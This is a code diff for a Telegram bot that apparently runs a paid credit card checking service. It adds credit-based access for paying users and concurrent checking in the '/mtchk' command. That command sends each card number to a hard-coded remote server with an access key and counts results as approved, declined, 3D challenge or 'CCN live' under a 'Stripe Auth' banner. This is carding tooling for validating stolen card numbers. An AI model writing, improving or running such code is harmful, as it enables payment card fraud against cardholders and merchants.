@@ -1230,9 +1230,22 @@ user_cooldowns = {}
 
 
 async def check_authorization(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
+    user_id = update.effective_user.id
+
+    # Owner always allowed
+    if user_id == OWNER_ID:
+        return True
+
+    # Private chat → must be an authorized user with a plan
     if update.effective_chat.type == "private":
-        return update.effective_user.id == OWNER_ID
+        user_data = await get_user(user_id)
+        if user_data and user_data.get("plan") and user_data.get("credits", 0) > 0:
+            return True
+        return False
+
+    # In groups → allow all
     return True
+
 
 
 async def enforce_cooldown(user_id: int, update: Update) -> bool:
@@ -1415,9 +1428,22 @@ user_cooldowns = {}
 
 # ─── Authorization & Credits ──────────────────────
 async def check_authorization(update: Update) -> bool:
+    user_id = update.effective_user.id
+
+    # Owner always allowed
+    if user_id == OWNER_ID:
+        return True
+
+    # Private chat → only users with a plan and credits
     if update.effective_chat.type == "private":
-        return update.effective_user.id == OWNER_ID
+        user_data = await get_user(user_id)
+        if user_data and user_data.get("plan") and user_data.get("credits", 0) > 0:
+            return True
+        return False
+
+    # Groups → allow everyone
     return True
+
 
 async def enforce_cooldown(user_id: int, update: Update) -> bool:
     cooldown = 5
@@ -1444,13 +1470,22 @@ async def consume_credit(user_id: int) -> bool:
 # ─── Helper ───────────────────────────────────────
 def normalize_status_text(s: str) -> str:
     mapping = {
-        '𝑨': 'A', '𝒑': 'p', '𝒓': 'r', '𝒐': 'o', '𝒗': 'v', '𝒆': 'e', '𝒅': 'd',
-        '𝑫': 'D', '𝒄': 'c', '𝒍': 'l', '𝒊': 'i', '𝒏': 'n', '𝐞': 'e',
-        '𝐂': 'C', '𝐚': 'a', '𝐫': 'r', '𝐝': 'd', '𝐥': 'l', '𝐢': 'i',
-        '𝐍': 'N', '𝐋': 'L', '𝐯': 'v', '𝟑': '3', '𝗗': 'D', '𝗖': 'C',
-        '𝗵': 'h', '𝗴': 'g', '𝗾': 'q', '𝘂': 'u', '𝗥': 'R', '𝗲': 'e',
+        '𝐀':'A','𝐁':'B','𝐂':'C','𝐃':'D','𝐄':'E','𝐅':'F','𝐆':'G','𝐇':'H','𝐈':'I','𝐉':'J',
+        '𝐊':'K','𝐋':'L','𝐌':'M','𝐍':'N','𝐎':'O','𝐏':'P','𝐐':'Q','𝐑':'R','𝐒':'S','𝐓':'T',
+        '𝐔':'U','𝐕':'V','𝐖':'W','𝐗':'X','𝐘':'Y','𝐙':'Z',
+        '𝐚':'a','𝐛':'b','𝐜':'c','𝐝':'d','𝐞':'e','𝐟':'f','𝐠':'g','𝐡':'h','𝐢':'i','𝐣':'j',
+        '𝐤':'k','𝐥':'l','𝐦':'m','𝐧':'n','𝐨':'o','𝐩':'p','𝐪':'q','𝐫':'r','𝐬':'s','𝐭':'t',
+        '𝐮':'u','𝐯':'v','𝐰':'w','𝐱':'x','𝐲':'y','𝐳':'z',
+        '𝗔':'A','𝗕':'B','𝗖':'C','𝗗':'D','𝗘':'E','𝗙':'F','𝗚':'G','𝗛':'H','𝗜':'I','𝗝':'J',
+        '𝗞':'K','𝗟':'L','𝗠':'M','𝗡':'N','𝗢':'O','𝗣':'P','𝗤':'Q','𝗥':'R','𝗦':'S','𝗧':'T',
+        '𝗨':'U','𝗩':'V','𝗪':'W','𝗫':'X','𝗬':'Y','𝗭':'Z',
+        '𝗮':'a','𝗯':'b','𝗰':'c','𝗱':'d','𝗲':'e','𝗳':'f','𝗴':'g','𝗵':'h','𝗶':'i','𝗷':'j',
+        '𝗸':'k','𝗹':'l','𝗺':'m','𝗻':'n','𝗼':'o','𝗽':'p','𝗾':'q','𝗿':'r','𝘀':'s','𝘁':'t',
+        '𝘂':'u','𝘃':'v','𝘄':'w','𝘅':'x','𝘆':'y','𝘇':'z',
+        '𝟑':'3'
     }
     return "".join(mapping.get(char, char) for char in s)
+
 
 # ─── /mtchk Handler ────────────────────────────────
 async def mtchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1512,43 +1547,49 @@ async def mtchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
     asyncio.create_task(background_check_multi(update, context, cards, processing_msg))
 
 # ─── Background Task ──────────────────────────────
+
 async def background_check_multi(update, context, cards, processing_msg):
-    results = []  # <-- define results here
+    results = []
     approved = declined = threed = live = 0
     total = len(cards)
+    sem = asyncio.Semaphore(10)  # max 10 concurrent requests
 
     async with aiohttp.ClientSession() as session:
-        for i, card in enumerate(cards, start=1):
-            try:
-                async with session.get(
-                    f"http://31.97.66.195:8000/?key=k4linuxx&card={card}",
-                    timeout=20
-                ) as resp:
-                    data = await resp.json()
-                    status = data.get("status", "Unknown")
-            except Exception as e:
-                status = f"Error: {str(e)}"
 
-            # Append result
+        async def check_card(card):
+            async with sem:
+                try:
+                    async with session.get(
+                        f"http://31.97.66.195:8000/?key=k4linuxx&card={card}",
+                        timeout=20
+                    ) as resp:
+                        data = await resp.json()
+                        status = data.get("status", "Unknown")
+                except Exception as e:
+                    status = f"Error: {str(e)}"
+                return card, status
+
+        tasks = [check_card(card) for card in cards]
+
+        for i, future in enumerate(asyncio.as_completed(tasks), start=1):
+            card, status = await future
             results.append(f"{card} → {status}")
 
-            # Count statuses
             st_low = normalize_status_text(status).lower().strip()
-            if st_low.startswith("approved"):
+            if "approved" in st_low:
                 approved += 1
-            elif st_low.startswith("declined"):
+            elif "declined" in st_low:
                 declined += 1
-            elif st_low.startswith("3d challenge required"):
+            elif "3d" in st_low:
                 threed += 1
-            elif st_low.startswith("ccn live"):
+            elif "ccn live" in st_low:
                 live += 1
 
-            # Update progress bar every 2 cards or at the end
+            # Update progress every 2 cards or at the end
             if i % 2 == 0 or i == total:
                 filled_len = round((i / total) * 10)
                 empty_len = 10 - filled_len
                 bar = "■" * filled_len + "□" * empty_len
-
                 progress_text = (
                     f"━━ ⚡𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵⚡ ━━\n"
                     f"💳 Total: {total} | ✅ Checked: {i}/{total}\n"
@@ -1556,7 +1597,6 @@ async def background_check_multi(update, context, cards, processing_msg):
                     f"│ [{bar}] │\n"
                     f"╰──────────────────╯"
                 )
-
                 try:
                     await processing_msg.edit_text(progress_text)
                 except Exception:
